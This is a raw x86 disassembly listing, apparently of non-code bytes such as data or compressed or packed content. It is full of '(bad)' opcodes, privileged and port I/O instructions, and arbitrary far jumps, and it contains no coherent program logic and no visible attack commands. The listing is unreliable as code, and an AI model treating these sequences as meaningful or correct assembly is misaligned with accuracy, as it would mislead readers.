  435f20:	or     eax,DWORD PTR [esi+0x62]
  435f23:	outs   dx,BYTE PTR ds:[esi]
  435f24:	sub    eax,0x3c58ec38
  435f29:	jge    0x435f20
  435f2b:	push   DWORD PTR [ebx]
  435f2d:	inc    esi
  435f2e:	dec    esi
  435f2f:	push   0x53
  435f31:	imul   eax,DWORD PTR [eax+esi*8-0x44],0xffffffc4
  435f36:	imul   edi,edi,0x564dedd3
  435f3c:	pop    esi
  435f3d:	dec    eax
  435f3e:	mov    DWORD PTR [ebp-0x34],eax
  435f41:	xor    al,0xe8
  435f43:	xor    bp,si
  435f46:	cmc    
  435f47:	push   edi
  435f48:	call   0x52b8:0xa9896d4a
  435f4f:	call   0xfb310f61
  435f54:	inc    edx
  435f55:	(bad)
  435f58:	fcom   DWORD PTR [edx]
  435f5a:	jl     0x435fa0
  435f5c:	xor    eax,0x2a4497d9
  435f61:	scas   al,BYTE PTR es:[edi]
  435f62:	dec    edi
  435f63:	sti    
  435f64:	adc    ah,BYTE PTR [ebx+0x35]
  435f67:	add    DWORD PTR ds:0x2d5c75d7,ecx
  435f6d:	outs   dx,DWORD PTR ds:[esi]
  435f6e:	dec    ebx
  435f6f:	in     al,0x0
	...
  435f8d:	add    BYTE PTR [esp+ebp*1-0x24],al
  435f91:	jae    0x435fa9
  435f93:	bound  edx,QWORD PTR [ebx-0x18]
  435f96:	mov    BYTE PTR [eax+ebp*8],dl
  435f99:	out    0x88,eax
  435f9b:	icebp  
  435f9c:	(bad)  
  435f9d:	call   DWORD PTR [esp+ecx*1-0x56bfc708]
  435fa4:	ja     0x435fcc
  435fa6:	addr16 cli 
  435fa8:	jp     0x43601e
  435faa:	mov    ebp,0x40fedc41
  435faf:	mov    ?,eax
  435fb1:	cli    
  435fb2:	cmp    BYTE PTR [ecx+0x135dc17c],cl
  435fb8:	add    BYTE PTR [edi-0x80],dl
  435fbb:	in     al,0x9e
  435fbd:	out    0xae,eax
  435fbf:	(bad)  
  435fc0:	lock cli 
  435fc2:	inc    esp
  435fc3:	adc    BYTE PTR [ebx+0x44],bh
  435fc6:	lods   eax,DWORD PTR ds:[esi]
  435fc7:	jb     0x435fa2
  435fc9:	out    0x38,eax
  435fcb:	icebp  
  435fcc:	(bad)  
  435fcd:	(bad)  
  435fce:	ds xor dh,cl
  435fd1:	je     0x435f58
  435fd3:	bound  ebp,QWORD PTR [ebx]
  435fd5:	loopne 0x435ff6
  435fd7:	cdq    
  435fd8:	(bad)  
  435fd9:	cli    
  435fda:	pop    edx
  435fdb:	add    BYTE PTR [ebx-0x8],cl
  435fde:	loope  0x435f85
  435fe0:	xor    edi,0xc
  435fe3:	xchg   edi,eax
  435fe4:	je     0x435f6d
  435fe6:	inc    ebp
  435fe7:	add    BYTE PTR [eax-0x1d],ch
  435fea:	or     eax,0xc583e900
  435fef:	cld    
  435ff0:	lahf   
  435ff1:	test   BYTE PTR [eax],al
	...
  43600f:	add    BYTE PTR [ebp-0x1a],dl
  436012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436013:	jbe    0x435fc1
  436015:	mov    ch,cl
  436017:	lds    ebx,FWORD PTR [ebp-0x18]
  43601a:	outs   dx,DWORD PTR ds:[esi]
  43601b:	inc    edi
  43601c:	cmp    eax,0x4d34ed6d
  436021:	fninit 
  436023:	fcomi  st,st(0)
  436025:	(bad)  
  436026:	loope  0x436018
  436028:	test   DWORD PTR ds:0x6bca2cb5,edi
  43602e:	sub    bh,BYTE PTR [ebp-0x36]
  436031:	jp     0x436056
  436033:	in     al,dx
  436034:	bnd jbe 0x435fd7
  436037:	lock idiv DWORD PTR [ebx-0x58]
  43603b:	ja     0x436059
  43603d:	jne    0x43606a
  43603f:	mov    esp,0x55165352
  436044:	(bad)  
  436045:	ins    BYTE PTR es:[edi],dx
  436046:	cmc    
  436047:	jle    0x436092
  436049:	shl    BYTE PTR ds:0x4d0cc654,1
  43604f:	adc    ecx,DWORD PTR [ebp+0x0]
  436052:	data16 jmp 0x436062
  436055:	ins    DWORD PTR es:[edi],dx
  436056:	(bad)  
  436058:	cmp    DWORD PTR [ebp+ebp*2-0x77282aba],esi
  43605f:	fldenv [edi-0x3689961a]
  436065:	js     0x436012
  436067:	not    DWORD PTR [edi-0x32ea8ef4]
  43606d:	call   DWORD PTR [ecx+0x76]
  436070:	pop    ecx
  436071:	xlat   BYTE PTR ds:[ebx]
  436072:	fchs   
	...
  436090:	add    BYTE PTR [eax],al
  436092:	ja     0x43607a
  436094:	into   
  436095:	pop    ebp
  436096:	sub    BYTE PTR [esp+edi*8-0x199810],0x90
  43609e:	inc    esi
  43609f:	cmp    DWORD PTR [ebp+0x2e],esi
  4360a2:	pop    ebp
  4360a3:	pop    esp
  4360a4:	outs   dx,DWORD PTR ds:[esi]
  4360a5:	je     0x436082
  4360a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4360a8:	push   edi
  4360a9:	adc    edx,edx
  4360ab:	ins    BYTE PTR es:[edi],dx
  4360ac:	sti    
  4360ad:	push   ss
  4360ae:	ror    DWORD PTR [ebx-0xc],0x62
  4360b2:	sti    
  4360b3:	ret    
  4360b4:	sbb    ah,BYTE PTR ss:[esi+0x4e]
  4360b8:	je     0x436063
  4360ba:	push   cs
  4360bb:	sti    
  4360bc:	inc    ebx
  4360bd:	sbb    ecx,esi
  4360bf:	mov    esi,0x2756a50a
  4360c4:	pop    ebp
  4360c5:	int    0x95
  4360c7:	in     eax,0x85
  4360c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4360ca:	xchg   BYTE PTR [eax+edx*1+0x3b],ch
  4360ce:	pop    eax
  4360cf:	push   eax
  4360d0:	sti    
  4360d1:	push   esp
  4360d2:	icebp  
  4360d3:	je     0x436059
  4360d5:	add    eax,0xbefaeae2
  4360da:	fs aam 0xfa
  4360dd:	cmp    al,0xe1
  4360df:	xor    eax,0xd2ebf7fb
  4360e4:	xchg   cl,al
  4360e6:	push   esi
  4360e7:	mov    edi,0xeadb55e7
  4360ec:	cli    
  4360ed:	push   0xffffffd5
  4360ef:	or     ebx,edi
  4360f1:	adc    al,0xb5
  4360f3:	(bad)  [ebx+0x97]
	...
  436111:	add    BYTE PTR [eax],al
  436113:	add    BYTE PTR [edx-0x350b0516],ah
  436119:	jle    0x43614f
  43611b:	mov    ch,0xff
  43611d:	aas    
  43611e:	add    BYTE PTR [esi-0x3d],ch
  436121:	jmp    0xd4fa:0xcfa25974
  436128:	jmp    0xc404:0x56d1
  43612e:	cli    
  43612f:	aaa    
  436130:	push   0x6c
  436132:	clc    
  436133:	add    bl,cl
  436135:	int    0x84
  436137:	inc    ebp
  436138:	sub    esi,DWORD PTR ds:0xc22d5b56
  43613e:	push   es
  43613f:	add    BYTE PTR [ecx-0x77e1896],al
  436145:	xchg   ebx,eax
  436146:	cld    
  436147:	push   DWORD PTR [edx+ebp*2]
  43614a:	inc    esp
  43614b:	or     al,0x82
  43614d:	cmp    BYTE PTR [edx+0x73d6742c],0x8
  436154:	mov    ecx,0x2bfd4276
  436159:	(bad)  
  43615a:	dec    edx
  43615b:	mov    DWORD PTR [ecx-0x13],ebp
  43615e:	loop   0x436183
  436160:	push   esp
  436161:	(bad)  
  436162:	cmc    
  436163:	test   DWORD PTR [esi+eiz*8+0x7e],esp
  436167:	jmp    0x8d436261
  43616c:	jno    0x436197
  43616e:	std    
  43616f:	dec    ebx
  436171:	push   eax
  436172:	call   0xf616127b
  436177:	mov    eax,DWORD PTR [eax]
	...
  436195:	add    BYTE PTR [ebx+eiz*2-0x148e0f8c],ah
  43619c:	add    eax,0xfffb7484
  4361a1:	call   FWORD PTR [edi-0x5]
  4361a4:	mov    WORD PTR [ebp-0x48],cs
  4361a7:	dec    ebx
  4361a8:	dec    esi
  4361a9:	inc    DWORD PTR [ebp+ebp*4-0x6]
  4361ad:	jmp    DWORD PTR [edi+esi*2-0x57def046]
  4361b4:	(bad)  
  4361b5:	push   DWORD PTR [ecx+ebp*2-0x16d0f3bc]
  4361bc:	mov    edx,DWORD PTR [ebp-0x54]
  4361bf:	dec    esi
  4361c0:	push   eax
  4361c1:	call   DWORD PTR [ebp-0xc]
  4361c4:	test   al,al
  4361c6:	jnp    0x43623f
  4361c8:	lea    eax,[ecx]
  4361ca:	or     eax,0xe24efed7
  4361cf:	shl    BYTE PTR [ebp+ecx*4-0x8],0x7e
  4361d4:	inc    esi
  4361d5:	call   0xfb2d0c9d
  4361da:	xchg   esi,eax
  4361db:	fwait
  4361dc:	mul    BYTE PTR [ebp+0x5a]
  4361df:	popa   
  4361e0:	lds    ecx,FWORD PTR [edi-0x19]
  4361e3:	in     al,dx
  4361e4:	inc    esi
  4361e5:	call   0xfb2d84ad
  4361ea:	inc    edx
  4361eb:	xor    esi,0xffffff86
  4361ee:	clc    
  4361ef:	mov    dl,0xd
  4361f1:	inc    eax
  4361f2:	or     eax,0x46f2c772
  4361f7:	loopne 0x4361be
  4361f9:	cli    
	...
  436216:	add    BYTE PTR [eax],al
  436218:	cmp    ch,ah
  43621a:	ror    BYTE PTR [edx],0x91
  43621d:	jb     0x436222
  43621f:	add    BYTE PTR ds:0xd08635a,cl
  436225:	dec    edi
  436226:	lea    edi,gs:[eax-0x73]
  43622a:	dec    ebx
  43622b:	call   0xfb30af4b
  436230:	xchg   BYTE PTR [eax+eax*1],dl
  436233:	xchg   DWORD PTR ds:0x3fd85354,edx
  436239:	pop    esi
  43623a:	ror    BYTE PTR [ebp+0x3d],cl
  43623d:	xchg   edx,eax
  43623e:	mov    ss,WORD PTR [ebx-0x7b0126f3]
  436244:	int    0xc
  436246:	sti    
  436247:	xchg   BYTE PTR [eax],bh
  436249:	mov    cl,0xdb
  43624b:	out    0xc1,al
  43624d:	jae    0x43623b
  43624f:	mov    BYTE PTR [eax+0x7d],cl
  436252:	fadd   DWORD PTR [ebx]
  436254:	mov    ?,esp
  436256:	out    dx,eax
  436257:	push   DWORD PTR [ecx+eax*1]
  43625a:	jnp    0x4362d0
  43625c:	jge    0x43626f
  43625e:	fsubr  st(6),st
  436260:	push   ds
  436261:	add    BYTE PTR [edx-0x13],ah
  436264:	xchg   ebx,eax
  436265:	cmp    eax,0x750a78ed
  43626a:	mov    ebx,0x3276c8e3
  43626f:	push   edx
  436270:	fucom  st(2)
  436272:	push   edi
  436273:	cwde   
  436274:	push   0xffffffe3
  436276:	call   0xe4b10501
  43627b:	js     0x43627d
	...
  436299:	add    cl,ah
  43629b:	fild   WORD PTR [eax-0x54]
  43629e:	pop    esi
  43629f:	loop   0x4362c2
  4362a1:	jnp    0x436274
  4362a3:	out    0xd,eax
  4362a5:	or     dl,al
  4362a7:	pop    esp
  4362a8:	adc    DWORD PTR [ebx+esi*4],eax
  4362ab:	pop    eax
  4362ac:	pop    esp
  4362ad:	mov    bh,0xc2
  4362af:	loop   0x4362b2
  4362b1:	in     eax,dx
  4362b2:	ret    0x33d7
  4362b5:	jno    0x4362dd
  4362b7:	jecxz  0x436316
  4362b9:	ja     0x4362d0
  4362bb:	ja     0x436250
  4362bd:	out    dx,eax
  4362be:	mov    edi,DWORD PTR ds:0xa8fc86dd
  4362c4:	inc    eax
  4362c5:	js     0x436314
  4362c7:	add    dl,ah
  4362c9:	inc    edi
  4362ca:	cld    
  4362cb:	jl     0x436283
  4362cd:	cld    
  4362ce:	dec    esi
  4362cf:	shl    DWORD PTR [ebp-0x3d],1
  4362d2:	push   cs
  4362d3:	jns    0x4362f8
  4362d5:	ror    BYTE PTR [ebx+0x5ec36bff],1
  4362db:	test   DWORD PTR [edx-0x7f],0x71d001a
  4362e2:	test   BYTE PTR [ebx+0x6d],al
  4362e5:	inc    ebx
  4362e6:	or     eax,0x8853374a
  4362eb:	jl     0x436325
  4362ed:	in     eax,dx
  4362ee:	mov    bh,0xe2
  4362f0:	sbb    BYTE PTR [edi+0x51],bh
  4362f3:	clc    
  4362f4:	sbb    ah,bl
  4362f6:	stos   DWORD PTR es:[edi],eax
  4362f7:	ret    
  4362f8:	push   DWORD PTR [ebp-0x57]
  4362fb:	popa   
  4362fc:	(bad)  
  4362fd:	aad    0x0
	...
  43631b:	add    BYTE PTR [ecx+0x7e72fc6b],ah
  436321:	in     eax,0xd2
  436323:	pop    esi
  436324:	sti    
  436325:	out    0xfa,eax
  436327:	ds xchg ebx,eax
  436329:	lock jp 0x436317
  43632c:	cmp    al,0xcb
  43632e:	and    DWORD PTR [edx],0x69
  436331:	jle    0x4362b7
  436333:	jmp    0xbba96346
  436338:	fld    TBYTE PTR [ebx-0x1c]
  43633b:	xchg   ecx,eax
  43633c:	sbb    al,0xcb
  43633e:	out    0xb0,eax
  436340:	mov    ebp,0xb372fae6
  436345:	jmp    0x4362d3
  436347:	lods   al,BYTE PTR ds:[esi]
  436348:	xor    bh,BYTE PTR ss:[edi+0x26]
  43634c:	ss dec ebp
  43634e:	xchg   DWORD PTR [edi],ebp
  436350:	mov    esi,0x46ed447a
  436355:	cmp    ebx,0xbf7e26f6
  43635b:	jne    0x436369
  43635d:	out    0xbe,al
  43635f:	push   ebx
  436360:	xor    BYTE PTR [ebx+0x74],0xc5
  436364:	push   ecx
  436365:	fcomp  DWORD PTR ds:0x8ce6e65a
  43636b:	and    al,0xf1
  43636d:	xor    DWORD PTR [ebx+0x72],edx
  436370:	iret   
  436371:	xor    DWORD PTR [edi+0x7dd9e524],eax
  436377:	mov    ch,0xe6
  436379:	out    0x83,al
  43637b:	test   eax,0xaafce25d
	...
  43639c:	add    BYTE PTR [eax],al
  43639e:	imul   esi,DWORD PTR [eax-0x73],0x14
  4363a2:	lods   eax,DWORD PTR ds:[esi]
  4363a3:	dec    ecx
  4363a4:	call   0xfb28a791
  4363a9:	pop    esp
  4363aa:	dec    esp
  4363ab:	clc    
  4363ac:	dec    edi
  4363ad:	add    BYTE PTR [ebx],cl
  4363af:	popa   
  4363b0:	rcl    DWORD PTR [eax+0x1f],0x3f
  4363b4:	or     al,0xe8
  4363b6:	add    eax,0x28fff5d8
  4363bb:	mov    esp,0xb8f2026e
  4363c0:	jle    0x43639d
  4363c2:	pop    eax
  4363c3:	out    0xf5,eax
  4363c5:	jne    0x436433
  4363c7:	bound  ecx,QWORD PTR [esp+ebx*8-0x19]
  4363cb:	mov    ds:0xd037e8f5,eax
  4363d0:	cmc    
  4363d1:	jmp    DWORD PTR [ebx]
  4363d3:	outs   dx,DWORD PTR ds:[esi]
  4363d4:	or     al,ch
  4363d6:	out    0xc7,eax
  4363d8:	cmc    
  4363d9:	(bad)  
  4363da:	out    dx,eax
  4363db:	outs   dx,BYTE PTR ds:[esi]
  4363dc:	lock pop edi
  4363de:	dec    edi
  4363df:	bound  eax,QWORD PTR [esp+ecx*1-0x41]
  4363e3:	jecxz  0x43642f
  4363e5:	push   DWORD PTR [ebp-0x1b]
  4363e8:	add    DWORD PTR [esi],0x84ad67a
  4363ee:	addr16 mov ebp,0xe3f6c958
  4363f4:	cli    
  4363f5:	push   esp
  4363f6:	scas   eax,DWORD PTR es:[edi]
  4363f7:	(bad)  
  4363f8:	jg     0x4363e6
  4363fa:	mov    esp,0x27fffff9
  4363ff:	mov    esp,0x4532
	...
  436420:	cld    
  436421:	dec    ecx
  436422:	pop    es
  436423:	xchg   ebp,eax
  436424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436425:	dec    esi
  436426:	dec    edi
  436427:	lea    ebx,[ecx-0x2c0008b0]
  43642d:	mov    ebp,0x6854e843
  436432:	cmp    eax,DWORD PTR [eax]
  436434:	addr16 mov ebp,0x6b31e855
  43643a:	idiv   edi
  43643c:	push   ds
  43643d:	pop    ebx
  43643e:	lea    esi,[ebp-0x7c]
  436441:	xor    al,0xe8
  436443:	or     BYTE PTR ds:0x86fae705,0x98
  43644a:	dec    esi
  43644b:	lea    edx,[eax-0x5d051a1e]
  436451:	push   es
  436452:	stos   DWORD PTR es:[edi],eax
  436453:	add    BYTE PTR ds:0x508c7ed7,cl
  436459:	loop   0x436442
  43645b:	cli    
  43645c:	mov    ch,BYTE PTR [ebp-0x3e]
  43645f:	out    0xab,eax
  436461:	jecxz  0x436448
  436463:	cli    
  436464:	ds dec edx
  436466:	sub    al,bl
  436468:	add    bl,BYTE PTR [ebx-0x3c]
  43646b:	jmp    FWORD PTR [edx-0x2a]
  43646e:	xor    edi,0xb77ad162
  436474:	or     eax,0xef65fed7
  436479:	inc    ebx
  43647a:	jo     0x436440
  43647c:	in     eax,0x6f
  43647e:	push   0x749b35ec
  436483:	sti    
	...
  4364a0:	add    BYTE PTR [eax],al
  4364a2:	cmp    bl,BYTE PTR [ebx+0x40]
  4364a5:	clc    
  4364a6:	fnstsw WORD PTR [ebx+eax*1+0x53]
  4364aa:	cwde   
  4364ab:	push   ebx
  4364ac:	imul   edi,ebx,0x22
  4364af:	loope  0x4364fe
  4364b1:	dec    edi
  4364b2:	test   BYTE PTR [ebx-0x156f771a],cl
  4364b8:	call   0x3f1cadd1
  4364bd:	add    BYTE PTR [eax-0x77eb9557],cl
  4364c3:	sub    al,0xf0
  4364c5:	dec    edi
  4364c6:	pop    edx
  4364c7:	bound  edi,QWORD PTR [esi-0x13bb67b1]
  4364cd:	out    0xf4,eax
  4364cf:	mov    edi,0x961efae7
  4364d4:	fdiv   st(6),st
  4364d6:	(bad)  
  4364d7:	mov    eax,ds:0x5088e8
  4364dc:	cdq    
  4364dd:	test   DWORD PTR [edx+0x331413df],edi
  4364e3:	or     BYTE PTR [edi+edi*1-0x43],ah
  4364e7:	aaa    
  4364e8:	cmp    ecx,ebp
  4364ea:	add    DWORD PTR [eax],esi
  4364ec:	fild   DWORD PTR [ebx+0xd]
  4364ef:	and    DWORD PTR [eax+edi*8+0x6f643e30],0x79
  4364f7:	cmp    BYTE PTR [ecx+0x61defdd8],al
  4364fd:	jge    0x43654b
  4364ff:	mov    DWORD PTR [ebx+0x414589eb],esp
  436505:	jnp    0x436507
	...
  436523:	add    cl,cl
  436525:	scas   eax,DWORD PTR es:[edi]
  436526:	pop    ebx
  436527:	jg     0x43651f
  436529:	fadd   QWORD PTR [ecx-0x17]
  43652c:	xchg   ebp,eax
  43652d:	inc    ebp
  43652e:	adc    eax,0x5fd7d177
  436533:	aas    
  436534:	xor    DWORD PTR [ebp-0x20b7a79d],ecx
  43653a:	and    DWORD PTR [eax+edx*4+0x4d],edx
  43653e:	cmp    ecx,eax
  436540:	shl    DWORD PTR [edi+0xd03eb],1
  436546:	and    bh,BYTE PTR [edi]
  436548:	sub    eax,0xd03e901
  43654d:	(bad)  
  43654e:	mov    ds:0xe8df18df,eax
  436553:	add    esp,DWORD PTR ds:0x7e87987
  436559:	mov    eax,DWORD PTR [ebx-0x28]
  43655c:	xor    eax,eax
  43655e:	and    BYTE PTR [edi],bh
  436560:	add    eax,0x73c37c0f
  436565:	rol    BYTE PTR [esp+ebx*8-0x61],0xd1
  43656a:	shr    eax,0x47
  43656d:	ds push ds
  43656f:	mov    ebx,0xe9000398
  436574:	inc    ebx
  436575:	xchg   ebx,ebp
  436577:	push   0xe8fd8ae2
  43657c:	push   cs
  43657d:	dec    edi
  43657e:	push   edx
  43657f:	ss pop ebx
  436581:	xor    eax,0x36891c8d
  436586:	call   0x436597
	...
  4365a3:	add    BYTE PTR [eax],al
  4365a5:	add    BYTE PTR [esi],bl
  4365a7:	(bad)  
  4365a9:	mov    edx,0xa7874dd1
  4365ae:	lea    edi,ds:[ecx+esi*8+0x31fad9ab]
  4365b6:	adc    BYTE PTR [eax],al
  4365b8:	add    BYTE PTR [ecx+0x66],ch
  4365bb:	mov    eax,ds:0x5d655e1b
  4365c0:	clc    
  4365c1:	push   esi
  4365c2:	jne    0x436546
  4365c4:	or     ebp,ebx
  4365c6:	push   cs
  4365c7:	add    BYTE PTR [edi],dh
  4365c9:	sub    ah,BYTE PTR [ebp-0x7e]
  4365cc:	add    ebp,ebx
  4365ce:	push   cs
  4365cf:	add    BYTE PTR [edi+0x14dabe2e],al
  4365d5:	jge    0x4365f7
  4365d7:	inc    eax
  4365d8:	add    BYTE PTR [eax+0x3],dh
  4365db:	mov    al,0x36
  4365dd:	sub    dh,BYTE PTR ds:0xee8ef82
  4365e3:	add    BYTE PTR [esi-0x49],ah
  4365e6:	mov    ds:0x46a1c45b,eax
  4365eb:	push   DWORD PTR [eax-0x2]
  4365ee:	xor    al,BYTE PTR [ebp+0x532599c2]
  4365f4:	shr    dh,1
  4365f6:	sbb    BYTE PTR [eax+0x1509290d],ch
  4365fc:	mov    edi,0xc57aee
  436601:	jmp    0x5c92b314
  436606:	and    al,0xdc
  436608:	push   eax
	...
  436625:	add    BYTE PTR [eax],al
  436627:	add    BYTE PTR [ecx+0x17],bl
  43662a:	loopne 0x43667d
  43662c:	fwait
  43662d:	mov    ah,0x83
  43662f:	shr    bl,0x80
  436632:	scas   al,BYTE PTR es:[edi]
  436633:	add    DWORD PTR [ecx+eax*1+0x59944583],esi
  43663a:	add    ecx,DWORD PTR [ebp-0x72b333ff]
  436640:	icebp  
  436641:	xchg   edi,eax
  436642:	dec    esp
  436643:	push   eax
  436644:	sub    eax,0x5fff847
  436649:	pusha  
  43664a:	test   eax,eax
  43664c:	stos   DWORD PTR es:[edi],eax
  43664d:	xor    BYTE PTR [ecx+0x1],0xa4
  436651:	add    DWORD PTR [ebx+0x3599445],eax
  436657:	(bad)  
  436658:	ror    ebp,0x4c
  43665b:	(bad)  
  43665c:	rol    ecx,0x4c
  43665f:	push   0x74
  436661:	xor    dh,bh
  436663:	jne    0x436681
  436665:	in     eax,0x73
  436667:	int3   
  436668:	test   dh,ah
  43666a:	dec    edi
  43666b:	cmp    cl,dh
  43666d:	ret    
  43666e:	add    eax,0x4a985
  436673:	add    BYTE PTR [edi+0x3b04c066],dh
  436679:	xor    BYTE PTR [ecx+eax*1],0x24
  43667d:	add    DWORD PTR [ebx+0x358f045],eax
  436683:	lea    esp,[ecx-0x47]
  436686:	dec    esp
  436687:	push   0x200134
	...
  4366a8:	add    BYTE PTR [eax],al
  4366aa:	je     0x436692
  4366ac:	dec    edi
  4366ad:	cmp    BYTE PTR [ecx-0x2b7afa3d],ah
  4366b3:	add    eax,DWORD PTR [eax]
  4366b5:	add    BYTE PTR [edi+0x40],bh
  4366b8:	call   0x549b6348
  4366bd:	enter  0x190d,0x4f
  4366c1:	push   eax
  4366c2:	jmp    0x7fd5:0xcd852017
  4366c9:	add    BYTE PTR [edi+eiz*8],cl
  4366cc:	inc    BYTE PTR [esi+0x775bf48]
  4366d2:	cwde   
  4366d3:	repz (bad) 
  4366d5:	dec    ebp
  4366d6:	pop    esi
  4366d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4366d8:	outs   dx,DWORD PTR ds:[esi]
  4366d9:	enter  0x7e5d,0x53
  4366dd:	dec    esp
  4366de:	mov    BYTE PTR [esi-0x194a7b0f],ah
  4366e4:	(bad)  
  4366e5:	call   DWORD PTR [esi+0x3888c82b]
  4366eb:	push   edi
  4366ec:	sub    al,0x18
  4366ee:	add    ch,BYTE PTR [ebp-0x31]
  4366f1:	dec    DWORD PTR [edx+0x695c7be6]
  4366f7:	push   ecx
  4366f8:	cmp    ah,ah
  4366fa:	mov    BYTE PTR [edx-0x6c7bfbfd],dh
  436700:	jmp    0x8481:0xf1e2cb38
  436707:	out    0xfe,al
  436709:	inc    DWORD PTR [ebx+edi*2+0x86d2]
	...
  43672c:	rcr    esi,cl
  43672e:	std    
  43672f:	jl     0x43676a
  436731:	fadd   st,st(5)
  436733:	xchg   BYTE PTR [edx],cl
  436735:	mov    ah,0x4
  436737:	add    BYTE PTR [esi],cl
  436739:	mov    bh,0x6a
  43673b:	and    eax,0x87577bc5
  436740:	rcr    dh,cl
  436742:	pop    eax
  436743:	inc    eax
  436744:	mov    ebp,0xfe701005
  436749:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43674a:	inc    BYTE PTR [ebp+ecx*2-0x7d04b7a6]
  436751:	loope  0x4367d0
  436753:	mov    DWORD PTR [edx],0xf5377401
  436759:	call   0xdc3b3947
  43675e:	pop    esi
  43675f:	int3   
  436760:	repz adc ebx,DWORD PTR [esi+0x3d]
  436764:	adc    eax,0xd6542966
  436769:	cmc    
  43676a:	dec    esp
  43676b:	adc    DWORD PTR [ebp+0x0],ecx
  43676e:	ins    BYTE PTR es:[edi],dx
  43676f:	les    edi,FWORD PTR [esi]
  436771:	pop    ss
  436772:	stos   BYTE PTR es:[edi],al
  436773:	ins    DWORD PTR es:[edi],dx
  436774:	adc    eax,0x30e5b07f
  436779:	add    BYTE PTR [ecx-0x6e243846],dl
  43677f:	jns    0x436723
  436781:	test   DWORD PTR [ecx+0x66331770],ecx
  436787:	mov    esp,0xec2b8d97
  43678c:	stos   BYTE PTR es:[edi],al
  43678d:	mov    esp,0xe597
	...
  4367ae:	xchg   DWORD PTR [esi+0x7c754d90],eax
  4367b4:	dec    edi
  4367b5:	in     eax,0x77
  4367b7:	test   BYTE PTR ds:0x290f1d70,bh
  4367bd:	pop    esp
  4367be:	leave  
  4367bf:	mov    ebp,DWORD PTR [eax-0x4c7332fd]
  4367c5:	jmp    0x436839
  4367c7:	rcl    BYTE PTR [edi],0xe5
  4367ca:	push   edi
  4367cb:	fld    TBYTE PTR [ebx+0x354593ef]
  4367d1:	or     ecx,0xcf28f8eb
  4367d7:	add    ebp,edx
  4367d9:	and    DWORD PTR [esi-0x41aee26],0x213f5db6
  4367e3:	fstp   TBYTE PTR [edx-0x5]
  4367e6:	xchg   ebx,eax
  4367e7:	or     BYTE PTR [ecx-0x8421c],bl
  4367ed:	cmc    
  4367ee:	dec    ebx
  4367ef:	rol    BYTE PTR [esi+0x4c81caa4],1
  4367f5:	(bad)  [ebp+0x25ede443]
  4367fb:	or     BYTE PTR [ebx],cl
  4367fd:	imul   ebx,DWORD PTR ds:0x65cefad7,0x4c
  436804:	cld    
  436805:	jb     0x436806
  436807:	das    
  436808:	push   ecx
  436809:	mov    esi,0x2c86f83c
  43680e:	jmp    0x5c6f94
	...
  43682f:	add    BYTE PTR [eax-0x48df7d1],ch
  436835:	mov    bl,0x86
  436837:	icebp  
  436838:	pop    esi
  436839:	xlat   BYTE PTR ds:[ebx]
  43683a:	push   eax
  43683b:	loope  0x436862
  43683d:	inc    esp
  43683e:	cld    
  43683f:	mov    ?,WORD PTR [ebx]
  436841:	mov    eax,0xd73ef186
  436846:	push   eax
  436847:	loope  0x43685e
  436849:	inc    esp
  43684a:	loopne 0x4368ae
  43684c:	xchg   BYTE PTR [edx-0x5],cl
  43684f:	sbb    BYTE PTR [ecx-0xa9abb7f],al
  436855:	add    dl,BYTE PTR [eax+0x5e]
  436858:	fild   WORD PTR [edi]
  43685a:	xchg   DWORD PTR [esi+esi*2+0x46b15464],esi
  436861:	dec    ebp
  436862:	lock inc esi
  436864:	jno    0x43683b
  436866:	je     0x436881
  436868:	imul   esi,ebx,0xffcedbb7
  43686e:	pop    edx
  43686f:	(bad)  
  436870:	aad    0xc8
  436872:	mov    esi,0x80e6b5bc
  436877:	or     eax,0xe8ffff72
  43687c:	mov    ebp,0x9e81532d
  436881:	out    dx,al
  436882:	aas    
  436883:	add    BYTE PTR [esi+esi*1],ah
  436886:	nop
  436887:	pop    ss
  436888:	fs (bad) 
  43688a:	out    0x22,eax
  43688c:	call   0xfcce688e
  436891:	push   edi
  436892:	jl     0x436874
	...
  4368b0:	add    BYTE PTR [eax],al
  4368b2:	imul   ebx,ebp,0x3338405
  4368b8:	add    BYTE PTR [eax],al
  4368ba:	dec    esi
  4368bb:	sbb    al,0x8d
  4368bd:	jne    0x436863
  4368bf:	sbb    al,0xe8
  4368c1:	sbb    al,BYTE PTR [ebx-0x23]
  4368c4:	cmc    
  4368c5:	push   0x2d
  4368c7:	outs   dx,DWORD PTR ds:[esi]
  4368c8:	jae    0x4368ae
  4368ca:	sbb    al,0xec
  4368cc:	add    eax,0x81dd736f
  4368d1:	pop    es
  4368d2:	daa    
  4368d3:	addr16 hlt 
  4368d5:	add    BYTE PTR [edi],bh
  4368d7:	scas   al,BYTE PTR es:[edi]
  4368d8:	dec    edi
  4368d9:	(bad)  
  4368da:	icebp  
  4368db:	xchg   ebx,eax
  4368dc:	dec    edi
  4368dd:	push   edi
  4368de:	xchg   ebx,eax
  4368df:	adc    al,0xc
  4368e1:	test   DWORD PTR [ebp+ebp*8-0x7c],esp
  4368e5:	pop    ds
  4368e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4368e7:	std    
  4368e8:	dec    DWORD PTR [edx-0x7b48f85]
  4368ee:	and    eax,0x450f715
  4368f3:	xchg   DWORD PTR [edx+0xeee90f],edi
  4368f9:	add    BYTE PTR [ebx+ebp*2+0x52],dh
  4368fd:	lea    edi,[ecx+0x34]
  436900:	idiv   edi
  436902:	rcr    DWORD PTR [ebx],cl
  436904:	call   0xf621abdf
  436909:	mov    edi,DWORD PTR [ecx-0x4b]
  43690c:	or     DWORD PTR [eax],0xc4fdea4
  436912:	sbb    eax,0xfffa95
	...
  436933:	add    BYTE PTR [eax+esi*2],ah
  436936:	push   ebx
  436937:	in     al,dx
  436938:	or     eax,0xbcfb2e95
  43693d:	rol    BYTE PTR [edi-0x3893f541],cl
  436943:	call   DWORD PTR [edx]
  436945:	out    0x89,eax
  436947:	inc    esp
  436948:	stc    
  436949:	pop    ebp
  43694a:	or     al,0x8d
  43694c:	pop    eax
  43694d:	xlat   BYTE PTR ds:[ebx]
  43694e:	xor    al,0x68
  436950:	(bad)  
  436951:	fnstcw WORD PTR [esi]
  436953:	add    BYTE PTR [ebp-0x46],bl
  436956:	repz test ch,cl
  436959:	loope  0x4368e2
